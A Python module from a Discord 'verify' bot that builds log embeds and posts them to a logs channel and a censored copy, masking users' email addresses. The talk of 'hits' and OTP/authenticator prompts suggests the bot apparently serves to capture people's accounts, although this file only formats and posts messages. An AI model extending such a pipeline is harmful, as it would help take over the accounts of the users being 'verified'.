"""Log/censor embeds for hits and verifications.

Posting a log is a side path: a channel that was deleted, sits in a guild the bot
is not in, or lacks permissions must never abort the verification that triggered
it. That used to raise 403 ``Missing Access`` out of ``MyModalOne.callback`` at
the first log line, killing the flow after the user had already been sent the
OTP/authenticator embed.
"""

from discord import Embed, Member, Client
import datetime
import json
import logging

log = logging.getLogger("bot")

# One warning per channel id per process — a dead channel would otherwise flood
# the console on every verification attempt.
_warned_channels: set[int] = set()

def censor_mail(email: str) -> str:
    try:
        user, domain = email.rsplit("@", 1)

        def mask(s: str) -> str:
            if len(s) <= 1:
                return "*"
            if len(s) == 2:
                return s[0] + "*"
            return s[0] + "*" * (len(s) - 2) + s[-1]

        parts = domain.split(".")
        cd = mask(parts[0]) + "." + ".".join(parts[1:])
        return f"{mask(user)}@{cd}"
    except Exception:
        return "***@***"

def build_log_embed(description: str, color: int, thumbnail: str = None, user: Member = None, bot: Client = None) -> Embed:
    embed = Embed(description=description, colour=color)

    if thumbnail:
        embed.set_thumbnail(url=thumbnail)

    if user:
        embed.set_author(
            name=f"{user.name} | {user.id}",
            icon_url=user.display_avatar.url,
        )

    bot_name = bot.user.name if bot else "Verify Bot"
    footer_icon = bot.user.display_avatar.url if bot else None
    embed.set_footer(
        text=f"{bot_name} • {datetime.datetime.now().strftime('%d/%m/%Y, %H:%M')}",
        icon_url=footer_icon,
    )

    return embed

async def _resolve_channel(bot: Client, channel_id):
    """Channel from cache, else a fetch, else None (warning only once per id)."""
    if not channel_id:
        return None
    try:
        cid = int(channel_id)
    except (TypeError, ValueError):
        log.warning("send_logs: %r is not a channel id", channel_id)
        return None

    try:
        channel = bot.get_channel(cid)
    except Exception:
        channel = None
    if channel is not None:
        return channel

    try:
        return await bot.fetch_channel(cid)
    except Exception as exc:
        if cid not in _warned_channels:
            _warned_channels.add(cid)
            log.warning(
                "send_logs: channel %s unreachable (%s: %s) — fix the discord.*_channel "
                "ids in config/config.json (the bot must be in that server)",
                cid,
                exc.__class__.__name__,
                exc,
            )
        return None


async def _post(bot: Client, channel_id, *, content=None, embed=None, view=None) -> bool:
    channel = await _resolve_channel(bot, channel_id)
    if channel is None:
        return False
    try:
        await channel.send(content=content, embed=embed, view=view)
        return True
    except Exception:
        log.warning("send_logs: could not post to channel %s", channel_id, exc_info=True)
        return False


async def send_logs(bot: Client, embed: Embed = None, view=None, content: str = None, email: str = None, censored_only: bool = False) -> bool:
    """Post to the logs channel (plus a censored copy). Never raises."""
    try:
        config = json.load(open("config/config.json", "r"))
        discord_config = config.get("discord") or {}
        logs_channel_id = discord_config.get("logs_channel")
        censored_logs_channel_id = discord_config.get("censored_logs_channel")
    except Exception:
        log.warning("send_logs: discord channel config unreadable", exc_info=True)
        return False

    if not logs_channel_id:
        log.warning("send_logs: no discord.logs_channel configured")
        return False

    sent = False

    if not censored_only:
        sent = await _post(bot, logs_channel_id, content=content, embed=embed, view=view)

    if censored_logs_channel_id and censored_logs_channel_id != logs_channel_id:
        censored_embed = None
        if embed is not None:
            embed_dict = embed.to_dict()
            if email and "description" in embed_dict:
                embed_dict["description"] = embed_dict["description"].replace(email, censor_mail(email))
            censored_embed = Embed.from_dict(embed_dict)

        sent = await _post(bot, censored_logs_channel_id, content=content, embed=censored_embed, view=view) or sent

    return sent